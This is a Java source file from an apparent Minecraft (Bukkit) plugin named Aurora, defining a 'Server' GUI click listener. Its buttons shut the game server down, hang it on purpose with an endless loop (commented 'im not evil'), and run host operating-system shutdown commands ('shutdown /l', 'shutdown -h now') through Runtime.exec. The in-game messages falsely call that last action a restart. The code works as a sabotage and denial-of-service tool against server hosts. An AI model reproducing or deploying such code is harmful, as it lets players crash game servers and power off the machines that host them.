package me.oscarcusick.aurora.Listeners.GUIListeners;

import me.oscarcusick.aurora.Utility.GeneralUtility;
import net.md_5.bungee.api.ChatColor;
import org.bukkit.World;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.plugin.Plugin;

import java.io.IOException;

public class ServerGUIListener implements Listener {
    Plugin PluginInstance;
    public ServerGUIListener(Plugin PluginInstance) {
        this.PluginInstance = PluginInstance;
    }

    @EventHandler
    public void GUIClickListener(InventoryClickEvent event) {
        GeneralUtility GU = new GeneralUtility(PluginInstance);
        // if the username is not present where it should be && SAFETY CHECKS
        if ((event.getEventName().equalsIgnoreCase("InventoryCreativeEvent")) || (event == null)) {
            return;
        }
        else if (!event.getView().getTitle().equalsIgnoreCase((GU.AuroraChatLogo + GU.Grey + ChatColor.BOLD + "[" + GU.Purple + ChatColor.BOLD + "Server" + GU.Grey + ChatColor.BOLD + "]"))) {
            return;
        } event.setCancelled(true);

        switch (event.getCurrentItem().getType()) {
            case STRING:
                PluginInstance.getServer().shutdown();
                return;
            case BLAZE_POWDER:
                PluginInstance.getServer().savePlayers(); // save player information
                for (World LoadedWorld : PluginInstance.getServer().getWorlds()) {
                    LoadedWorld.save(); // save all worlds, im not evil
                }
                int i = 0;
                while (true) {
                    i++;
                }
                // never reach this lmfao
            case BRICK:
                if (System.getProperty("os.name") == null) {
                    GU.TellPlayer((Player)event.getWhoClicked(), "Can't fetch operating system");
                    return;
                }
                String[] OSRestartCommands = {"shutdown /l", "shutdown -h now"}; // [0] - windows, [1] - linux (most distros)

                if (System.getProperty("os.name").split(" ")[0].equalsIgnoreCase("Windows")) {
                    try {
                        GU.TellPlayer((Player)event.getWhoClicked(), "Attempting to restart Windows");
                        Process Exec = Runtime.getRuntime().exec(OSRestartCommands[0]);
                        // cant read output as that freezes server
                    } catch (IOException e) {
                        GU.TellPlayer((Player)event.getWhoClicked(), "getRuntime.exec(command) resulted in IOException");
                        throw new RuntimeException(e);
                    }
                } else {
                    try {
                        GU.TellPlayer((Player)event.getWhoClicked(), "Attempting to restart Linux");
                        Runtime.getRuntime().exec(OSRestartCommands[1]);
                        // cant read output as that freezes server
                    } catch (IOException e) {
                        GU.TellPlayer((Player)event.getWhoClicked(), "getRuntime.exec(command) resulted in IOException");
                        throw new RuntimeException(e);
                    }
                }

                return;
            default:
                return;
        }

    }
}
